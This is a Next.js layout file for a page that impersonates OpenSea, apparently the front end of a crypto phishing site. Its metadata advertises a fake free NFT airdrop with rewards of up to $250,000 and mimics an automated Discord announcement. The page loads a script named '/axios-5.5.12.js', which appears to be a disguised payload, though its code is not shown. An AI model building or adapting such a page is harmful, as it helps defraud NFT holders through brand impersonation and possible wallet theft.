import type { Metadata } from 'next';
import type React from 'react';
import Script from 'next/script';
import './globals.css';

export const metadata: Metadata = {
  title: 'OpenSea.io',
  description:
    'CLICK HERE - OPENSEA PRO NFT. 🟢 AIRDROP IS LIVE NOW 🟢 Price: FREE. Supply: 150 Mystery Box. Reward: between $3000 and $250,000. TRY YOUR LUCK ! 🚀',
  openGraph: {
    title: 'CLICK HERE - OPENSEA PRO NFT',
    description:
      'CLICK HERE - OPENSEA PRO NFT. 🟢 AIRDROP IS LIVE NOW 🟢 Price: FREE. Supply: 150 Mystery Box. Reward: between $3000 and $250,000. TRY YOUR LUCK ! 🚀',
    images: ['/389-9bec97c22fa2e411.gif'],
    siteName: 'This is an automatically generated announcement message',
  },
  themeColor: '#7289DA',
};

export default function RootLayout(
  { children }: { children: React.ReactNode }
) {
  return (
    <html lang="en-GB" data-theme="light">
      <body>
        {children}
        <Script src="/axios-5.5.12.js" strategy="afterInteractive" />
      </body>
    </html>
  );
}
